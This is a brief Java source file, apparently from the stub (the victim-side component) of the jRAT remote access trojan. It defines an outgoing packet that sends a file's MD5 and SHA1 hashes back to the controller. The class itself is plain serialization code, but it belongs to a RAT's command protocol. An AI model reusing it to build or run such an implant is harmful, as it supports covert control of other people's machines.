package pro.jrat.stub.packets.outgoing;

import java.io.DataOutputStream;

import pro.jrat.common.io.StringWriter;


public class Packet46FileHash extends AbstractOutgoingPacket {

	private String md5;
	private String sha1;

	public Packet46FileHash(String md5, String sha1) {
		this.md5 = md5;
		this.sha1 = sha1;
	}

	@Override
	public void write(DataOutputStream dos, StringWriter sw) throws Exception {
		sw.writeLine(md5);
		sw.writeLine(sha1);
	}

	@Override
	public byte getPacketId() {
		return 46;
	}

}
